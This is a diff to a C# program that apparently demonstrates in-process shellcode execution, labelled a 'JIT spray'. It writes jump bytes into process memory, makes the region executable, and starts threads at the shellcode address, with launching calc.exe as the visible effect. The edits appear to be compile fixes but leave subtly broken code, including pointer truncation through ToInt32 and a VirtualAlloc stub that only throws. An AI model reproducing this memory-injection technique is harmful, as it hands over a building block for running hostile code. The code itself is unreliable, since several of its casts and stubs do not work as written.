@@ -1,6 +1,6 @@
 ﻿using System;
 using System.Runtime.InteropServices;
-
+using System.Diagnostics;
 
 class Program
 {
@@ -94,7 +94,9 @@ class Program
                 {
                     if (GetAsyncKeyState(0x01) != 0)
                     {
-                        CreateProcess("calc.exe", null, IntPtr.Zero, IntPtr.Zero, false, 0, IntPtr.Zero, null, ref STARTUPINFO, out PROCESS_INFORMATION);
+                        STARTUPINFO startupInfo = new STARTUPINFO();
+                        PROCESS_INFORMATION processInfo; // Declare a variable of type PROCESS_INFORMATION
+                        _ = CreateProcess("calc.exe", null, IntPtr.Zero, IntPtr.Zero, false, 0, IntPtr.Zero, null, ref startupInfo, out processInfo); // Pass the processInfo variable as an argument
                         break;
                     }
                     System.Threading.Thread.Sleep(10);
@@ -130,15 +132,18 @@ class Program
         WriteProcessMemory(GetCurrentProcess(), lpAddress, jmpCodeBytes, (uint)jmpCodeBytes.Length, out bytesWritten);
 
         // Calculate the address of the shellcode
-        uint shellcodeAddress = lpAddress.ToInt32() + (uint)jmpCode.Length;
+        uint shellcodeAddress = (uint)(lpAddress.ToInt32() + (uint)jmpCode.Length);
 
         // Change the memory protection of the shellcode to execute
         uint flOldProtect;
         VirtualProtect(new IntPtr(shellcodeAddress), (uint)jmpCodeBytes.Length, PAGE_EXECUTE_READ, out flOldProtect);
 
+       // Address of the CalcThread function
+       IntPtr pCalcThread = Marshal.GetFunctionPointerForDelegate(CalcThread);
+
         // Create a new thread to execute the shellcode
         UInt32 threadId;
-        CreateThread(IntPtr.Zero, 0, new IntPtr(CalcThread), new IntPtr(GetCurrentProcess()), 0, out threadId);
+        CreateThread(IntPtr.Zero, 0, pCalcThread, new IntPtr(GetCurrentProcess().ToInt32()), 0, out threadId);
 
         // Execute the shellcode
         IntPtr hModule = LoadLibrary("kernel32.dll");
@@ -186,6 +191,7 @@ class Program
                                                 // Trigger the JIT spray
                                                 IntPtr pExecuteJit = new IntPtr(shellcodeAddress);
                                                 CreateThread(IntPtr.Zero, 0, pExecuteJit, IntPtr.Zero, 0, out threadId);
+
                                             }
                                         }
                                     }
@@ -196,11 +202,17 @@ class Program
                 }
             }
         }
-
+        
         Console.WriteLine("Press Enter to exit.");
         Console.ReadLine();
     }
+
+    private static nint VirtualAlloc(nint zero, uint bufferSize, uint v, uint pAGE_EXECUTE_READWRITE)
+    {
+        throw new NotImplementedException();
+    }
 }
+
 
 [StructLayout(LayoutKind.Sequential)]
 public struct STARTUPINFO
